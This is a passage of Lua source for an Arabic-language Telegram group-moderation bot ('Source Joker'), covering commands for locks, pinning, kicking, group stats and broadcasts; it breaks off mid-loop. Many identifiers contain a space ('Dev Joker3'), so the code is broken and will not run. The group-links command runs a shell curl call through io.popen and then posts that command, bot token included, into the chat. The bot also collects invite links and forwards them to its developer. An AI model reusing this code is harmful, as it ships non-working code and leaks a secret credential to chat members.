if text and text:match("^الفشار$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local ABS_PROX = "\n" .."⌁︙الفشار ↫ "..lock_fshar.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
if text and text:match("^الطائفيه$") then if not DevAbs:get(Dev Joker..'bot:lock_Settings'..msg.chat_id_) then if DevAbs:get(Dev Joker..'taf'..msg.chat_id_) then lock_taf = 'مفتوحة' else lock_taf = 'مقفله' end local ABS_PROX = "\n" .."⌁︙الطائفيه ↫ "..lock_taf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md') end end
--     Source Joker     --
if text == 'تفعيل كشف الاعدادات' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:lock_Settings'..msg.chat_id_) 
end
if text == 'تعطيل كشف الاعدادات' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:lock_Settings'..msg.chat_id_,true)  
end
--     Source Joker     --
if text == 'تفعيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل منو ضافني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'Added:Me'..msg.chat_id_) 
end
if text == 'تعطيل ضافني' and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل منو ضافني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'Added:Me'..msg.chat_id_,true)  
end
--     Source Joker     --
if is_leader(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌁' then   
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل المغادرة بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker.."Left:Bot"..bot_id)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌁' then  
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل المغادرة بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker.."Left:Bot"..bot_id,true) 
end end
--     Source Joker     --
if text and text:match("^ضع اسم (.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
changetitle(msg.chat_id_, txt[2])
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير اسم المجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
--     Source Joker     --
if msg.content_.photo_ then
if DevAbs:get(Dev Joker..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تغيير صورة المجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_)
setphoto(msg.chat_id_, photo_id)
end 
end
if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل صورة المجموعة الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:setphoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source Joker     --
if text and text:match('^↫ المجموعات ⌁$') or text and text:match('^المجموعات$') and ChCheck(msg) then
if not is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط ', 1, 'md')
else
local list = DevAbs:smembers(Dev Joker.."bot:groups")
local t = '⌁︙مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.." ⌯ ❨`"..v.."`❩\n" 
end
if #list == 0 then
t = '⌁︙*لا يوجد مجموعات مفعلة*'
end
Dev_Abs(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source Joker     --
if text and text:match("^الغاء تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if DevAbs:sismember(Dev Joker.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
unpinmsg(msg.chat_id_)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم الغاء تثبيت الرسالة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
--     Source Joker     --
if text and text:match("^اعاده تثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and is_owner(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
if DevAbs:sismember(Dev Joker.."bot:pin:mutepin",msg.chat_id_) and not is_monsh(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
return false  
end
local pin_id = DevAbs:get(Dev Joker..'pinnedmsg'..msg.chat_id_)
if pin_id then
pin(msg.chat_id_,pin_id,0)
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم اعادة تثبيت الرسالة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
else
end
end       
--     Source Joker     --
if text and text:match("^طرد الحسابات المحذوفه$") and ChCheck(msg) or text and text:match("^طرد المحذوفين$") and ChCheck(msg) or text and text:match("^حذف المحذوفين$") and ChCheck(msg) or text and text:match("^مسح المحذوفين$") and ChCheck(msg) then
local function deleteaccounts(extra, result)
for k,v in pairs(result.members_) do 
local function cleanaccounts(extra, result)
if not result.first_name_ then
changeChatMemberStatus(msg.chat_id_, result.id_, "Kicked")
end
end
getUser(v.user_id_, cleanaccounts, nil)
end 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم طرد المحذوفين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 1096500}, deleteaccounts, nil)
end
--     Source Joker     --
if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) then
local function removeblocklist(extra, result)
if tonumber(result.total_count_) == 0 then 
Dev_Abs(msg.chat_id_, msg.id_, 0,'⌁︙لا يوجد محظورين في المجموعة', 1, 'md')
else
local x = 0
for x,y in pairs(result.members_) do
changeChatMemberStatus(msg.chat_id_, y.user_id_, 'Left', dl_cb, nil)
DevAbs:del(Dev Joker..'abs:Ban:'..msg.chat_id_)
x = x + 1
end
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف المحظورين \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
end
end
getChannelMembers(msg.chat_id_, 0, 'Kicked', 200, removeblocklist, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_}) 
end
end
--     Source Joker     --
if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
function gpinfo(arg,data)
local Muted = DevAbs:scard(Dev Joker.."abs:Muted:"..msg.chat_id_) or "0"
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعة ↫ ❨ '..title_name(msg.chat_id_)..' ❩\n⌁︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌁︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌁︙عدد الادمنية ↫ ❨ *'..data.administrator_count_..'* ❩\n⌁︙عدد المحظورين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌁︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌁︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
end 
getChannelFull(msg.chat_id_, gpinfo, nil) 
end
--     Source Joker     --
if text and text:match('^كشف (-%d+)') then
local chattid = text:match('كشف (-%d+)') 
if not is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط ', 1, 'md')
else
function abs_c9(arg,data)
function ABS_PROX(f1,f2)
function Dev Joker3(t1,t2)
local list = DevAbs:smembers(Dev Joker.."abs:monsh:" .. chattid)
if list[1] or list[2] or list[3] or list[4] then
user_info = DevAbs:get(Dev Joker.."user:Name" .. (list[1] or list[2] or list[3] or list[4]))
end
if user_info then monsh = user_info else monsh = "لا يوجد" end
local Monsh = DevAbs:scard(Dev Joker.."abs:monshid:" .. chattid) or "0"
local Baned = DevAbs:scard(Dev Joker.."abs:Ban:" .. chattid) or "0"
local Owner = DevAbs:scard(Dev Joker.."abs:owners:" .. chattid) or "0"
local Muted = DevAbs:scard(Dev Joker.."abs:Muted:" .. chattid) or "0"
local Tkeed = DevAbs:scard(Dev Joker.."abs:abs:Tkeed:" .. chattid) or "0"
local admins = DevAbs:scard(Dev Joker.."abs:admins:" .. chattid) or "0"
local Vip = DevAbs:scard(Dev Joker.."abs:vipmem:" .. chattid) or "0"
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end
end
DevAbs:set(Dev Joker.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "@BLACK_TEAM_4")) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعة ↫ ( ["..title_name(chattid).."]("..(t2.invite_link_ or "t.me/BLACK_TEAM_4")..") )\n⌁︙الايدي ↫ ( *"..msg.chat_id_.."* )\n⌁︙المنشئ ↫ ( ["..monsh.."] )\n⌁︙عدد المدراء ↫ ( *"..Owner.."* )\n⌁︙عدد المنشئين ↫ ( *"..Monsh.."* )\n⌁︙عدد الادمنية ↫ ( *"..admins.."* )\n⌁︙عدد المميزين ↫ ( *"..Vip.."* )\n⌁︙عدد المحظورين ↫ ( *"..Baned.."* )\n⌁︙عدد المقيدين ↫ ( *"..Tkeed.."* )\n⌁︙عدد المكتومين ↫ ( *"..Muted.."* )", 1,"md")
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(chattid).ID }, Dev Joker3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getChannelFull(chattid, abs_c9, nil)
end 
end
--     Source Joker     --
if text and text:match("^غادر (-%d+)$")  then
local txt = { string.match(text, "^(غادر) (-%d+)$")}
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local leavegp = function(extra, result)
if result.id_ then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙المجموعة ↫ ( [" .. result.title_ .. "] )\n⌁︙تمت المغادرة منها بنجاح", 1, "md")
Dev_Abs(txt[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعة ", 1, "md")  
chat_leave(result.id_, bot_id)
DevAbs:srem(Dev Joker.."bot:groups", result.id_)
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي فيها لاقوم بمغادرتها ", 1, "md")
end end
getChat(txt[2], leavegp) 
end end
--     Source Joker     --
if text == 'تفعيل البوت الخدمي' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'lock:bot:free'..bot_id) 
end end
if text == 'تعطيل البوت الخدمي' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'lock:bot:free'..bot_id,true) 
end end
if text == 'تفعيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
local  ABS_PROX = '⌁︙تم تفعيل التنبيه على تغيير \n ⌯ ( صوره • اسم • معرف ) ⌯ : للاعضاء \n⌁︙في جميع مجموعات البوت ' 
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:del(Dev Joker..'lock:bot:ttt'..bot_id) 
end 
end
if text == 'تعطيل التنبيه' then 
if not is_sudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
else 
ABS_PROX = '⌁︙تم تعطيل التنبيه على تغيير \n ⌯ ( صوره • اسم • معرف ) ⌯ : للاعضاء\n⌁︙في جميع مجموعات البوت '
Dev_Abs( msg.chat_id_, msg.id_, 1, ABS_PROX, 1, "md") 
DevAbs:set(Dev Joker..'lock:bot:ttt'..bot_id,true) 
end
end
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تفعيل تنبيه التغيرات" and ChCheck(msg) then
if DevAbs:get(Dev Joker..'lock:bot:ttt'..bot_id) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙التنبيه على تغيير\n ⌯ ( صوره • اسم • معرف ) ⌯ : للاعضاء\n⌁︙معطل في جميع مجموعات البوت من قِبل المطور ', 1, 'md')
return false 
end
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل التنبيه على تغيير \n ⌯ ( صوره • اسم • معرف ) ⌯ : للاعضاء \n⌁︙في هذه المجموعة ', 1, 'md')
DevAbs:del(Dev Joker.."lock:bot:ttt2:"..msg.chat_id_)
end
end
if text and text == "تعطيل تنبيه التغيرات" and ChCheck(msg) then 
if not is_owner(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمشرفين فقط ', 1, 'md')
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل التنبيه على تغيير \n ⌯ ( صوره • اسم • معرف ) ⌯ : للاعضاء \n⌁︙في هذه المجموعة ', 1, 'md')
DevAbs:set(Dev Joker.."lock:bot:ttt2:"..msg.chat_id_,"ok")
end
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text == 'تعطيل اللعبه' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then   
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker..'bot:lock_geam'..msg.chat_id_,true)  
end
if text == 'تعطيل الالعاب' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) or text == 'تعطيل اللعبه' and is_admin(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then  
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker..'bot:lock_geam'..msg.chat_id_) 
end
if text and text == "تفعيل الرابط" and ChCheck(msg) then 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل رابط المجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:del(Dev Joker.."bot:tt:link:"..msg.chat_id_)
end
if text and text == "تعطيل الرابط" and ChCheck(msg) then 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل رابط المجموعة'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
DevAbs:set(Dev Joker.."bot:tt:link:"..msg.chat_id_,"ok")
end
if text and text:match('^تفعيل$') and is_SudoBot(msg.sender_user_id_, msg.chat_id_) and ChCheck(msg) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
DevAbs:del(Dev Joker..'abs:absmonsh:'..msg.chat_id_)
local admins = result.members_
for i=0 , #admins do
DevAbs:sadd(Dev Joker..'abs:admins:'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(Dev Joker.."abs:monsh:"..msg.chat_id_,owner_id)
DevAbs:sadd(Dev Joker.."abs:absmonsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(Dev Joker.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعة ،بالتاكيد ،مفعلة', 1, 'md')
else
Text = '⌁︙اهلا عزيزي ↫ ['..CatchName(result.first_name_,15)..'](tg://user?id='..result.id_..') \nلقد تم تفعيل المجموعة بنجاح \nتم رفع الادمنيه ومنشئ المجموعه \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function Dev Joker3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end
end
DevAbs:set(Dev Joker.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(Dev Joker.."bot:leader:gr") or DevId)), 0, 1, "⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي الضافني ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙معرف الضافني ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").." \n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, Dev Joker3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(Dev Joker.."bot:enable:"..msg.chat_id_,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
local send_to_DevId = function(extra, result)
local v = tonumber(DevId)             
end
end
end
getUser(msg.sender_user_id_,adding)
end
--     Source Joker     --
if is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text ==  ""..name_bot..' تعطيل' or text == 'تعطيل' then
function remgroup(extra, result, success)
if not DevAbs:get(Dev Joker.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙المجموعة ،بالتاكيد ،معطلة', 1, 'md')
else
Text = '⌁︙اهلا عزيزي ↫ ['..CatchName(result.first_name_,15)..'](tg://user?id='..result.id_..') \nلقد تم تعطيل المجموعة بنجاح \n ✓'
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
DevAbs:del(Dev Joker.."bot:enable:"..msg.chat_id_)
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_)
local v = tonumber(DevId)          
end
end
getUser(msg.sender_user_id_,remgroup)
end
end
end
--     Source Joker     --
if text and text:match("^تفعيل المجموعات$") and is_leader(msg) then
local gps = DevAbs:smembers(Dev Joker.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:sadd("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:set(Dev Joker.."bot:enable:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تفعيل البوت في '..(#gps - #gps2)..' مجموعه', 1, 'md')
end   
if text and text:match("^تعطيل المجموعات$") and is_leader(msg) then
local gps = DevAbs:smembers(Dev Joker.."bot:groups") or 0
local gps2 = DevAbs:smembers("ABS_PROX:addg"..bot_id) or 0
for i=1,#gps do
DevAbs:del("ABS_PROX:addg"..bot_id, gps[i])
DevAbs:del(Dev Joker.."bot:enable:"..gps[i],true)
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تعطيل البوت في '..(#gps - #gps2)..' مجموعه', 1, 'md')
end   
--     Source Joker     --
if text and text:match("^الدعم$") or text and text:match("^المطور$") then
function adding(extra,result,success)
function ABS_PROX(f1,f2)
function Dev Joker3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
t2.invite_link_ = link.result
end
end
DevAbs:set(Dev Joker.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "لايوجد")) 
Dev_Abs(tostring((DevAbs:get(Dev Joker.."bot:leader:gr") or DevId)), 0, 1, "⌁︙هناك من بحاجه الى مساعده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ايدي الشخص ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙معرف الشخص ↫ ❨ @"..(result.username_ or "لا يوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معلومات المجموعه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اسم المجموعه ↫ ❨ "..f2.title_.." ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ "..msg.chat_id_.." ❩\n⌁︙رابط المجموعه ↫ ⤈ \n❨ "..(t2.invite_link_ or "لايوجد").." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").." \n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."" , 1, 'html') 
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, Dev Joker3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
end
getUser(msg.sender_user_id_,adding)
end
--     Source Joker     --
if text == 'نسخه ملف السورس' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(DevId, 0, 0, 1, nil, './Dev Joker.lua', dl_cb, nil)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عزيزي المطور تم ارسال نسخة ملف السورس الى الخاص ', 1, 'md')
end end
--     Source Joker     --
if text == 'روابط المجموعات' and ChCheck(msg) or text == 'روابط المجموعات' and ChCheck(msg) then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local groups = function(extra, result) 
local num = (DevAbs:scard(Dev Joker.."bot:groups"))
local list = DevAbs:smembers(Dev Joker.."bot:groups")
local text = "(Source Joker - سورس فكتور)\nΞ - File bot groups -\nΞ - ملف مجموعات البوت -\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
for k,v in pairs(list) do
local GroupsMonsh = DevAbs:scard(Dev Joker.."abs:monsh:"..v) or 0
local GroupsOwner = DevAbs:scard(Dev Joker.."abs:owners:"..v) or 0
local GroupsMod = DevAbs:scard(Dev Joker.."abs:admins:"..v) or 0
local Groupslink = DevAbs:get(Dev Joker.."bot:group:link" ..v)
text = text..k.." ↬ ⤈ \n⌁︙Group ID  : [ "..v.." ]\n⌁︙Group Link : [ "..(Groupslink or "Not Found").." ]\n⌁︙Group Monsh  : [ "..GroupsMonsh.." ]\n⌁︙Group Owners  : [ "..GroupsOwner.." ]\n⌁︙Group Admins : [ "..GroupsMod.." ] \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end
local file = io.open('GroupsBot.txt', 'w')
file:write(text)
file:close()
local abbss = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local abbsss = 'curl "' .. abbss .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(abbsss)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙جاري ارسال نسخة تحتوي على '..num..' مجموعه', 1, 'md')
sleep(1.5)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbsss, 1, 'md')
end
getUser(msg.sender_user_id_, groups)
end
end
--     Source Joker     --
if text == "اذاعه بالخاص" and msg.reply_to_message_id_ == 0 and is_leader(msg) or text == "↫ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and is_leader(msg) then 
DevAbs:setex(Dev Joker.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local ABS_PROX = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملصق • متحركه • صوره • رساله ❩ \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 14, string.len(msg.sender_user_id_))
return false
end 
if DevAbs:get(Dev Joker.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevAbs:del(Dev Joker.."Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevAbs:smembers(Dev Joker..'bot:userss') 
if msg.content_.text_ then
for k,v in pairs(list) do 
